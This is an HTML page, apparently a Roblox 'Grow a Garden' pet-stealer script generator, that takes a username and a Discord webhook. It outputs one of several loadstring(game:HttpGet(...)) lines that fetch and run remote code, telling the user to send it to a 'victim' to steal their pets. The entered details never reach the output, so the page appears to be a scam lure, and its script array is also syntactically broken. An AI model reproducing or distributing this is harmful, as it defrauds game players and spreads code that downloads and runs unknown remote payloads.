<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Grow a Garden Pet Stealer Script Generator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #0f0f0f, #1e1e2f);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(20, 20, 40, 0.9);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #0ff, 0 0 40px #09f inset;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    h2 {
      color: #0ff;
      text-shadow: 0 0 10px #09f, 0 0 20px #0ff;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #2b2b3d;
      color: #0ff;
      font-size: 16px;
      box-shadow: inset 0 0 10px #09f;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 15px #0ff;
    }
    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, #0ff, #09f);
      color: #000;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
      margin-top: 15px;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #0ff;
    }
    #result {
      margin-top: 20px;
      font-size: 14px;
      color: #0ff;
      word-break: break-word;
    }
    code {
      display: block;
      background: #111;
      color: #0f0;
      padding: 10px;
      border-radius: 8px;
      font-size: 13px;
      box-shadow: inset 0 0 10px #0f0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>⚡ Stealer Script Generator ⚡</h2>
    <input type="text" id="username" placeholder="Username">
    <input type="text" id="webhook" placeholder="Discord Webhook">
    <button onclick="generateScript()">Generate Stealer Script</button>
    <div id="result"></div>
  </div>

  <script>
    const scripts = [
      'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/eggscript"))()',
      'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()'
      'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/Latest/refs/heads/main/Latest"))()'
      // 👆 add more scripts here if you like
    ];

    function generateScript() {
      const username = document.getElementById("username").value.trim();
      const webhook = document.getElementById("webhook").value.trim();
      const result = document.getElementById("result");

      if (!username || !webhook) {
        result.textContent = "❌ Please enter both Username and Webhook!";
        return;
      }

      result.textContent = "⚙️ Generating Stealer Script please wait...";
      
      setTimeout(() => {
        const chosen = scripts[Math.floor(Math.random() * scripts.length)];
        result.innerHTML = `✅ Send this to your victim to steal their pets <b>${username}</b>:<br><code>${chosen}</code><br><br><h1>Check here if someone used your stealer script</h1>`;
      }, 3000);
    }
  </script>
</body>
</html>
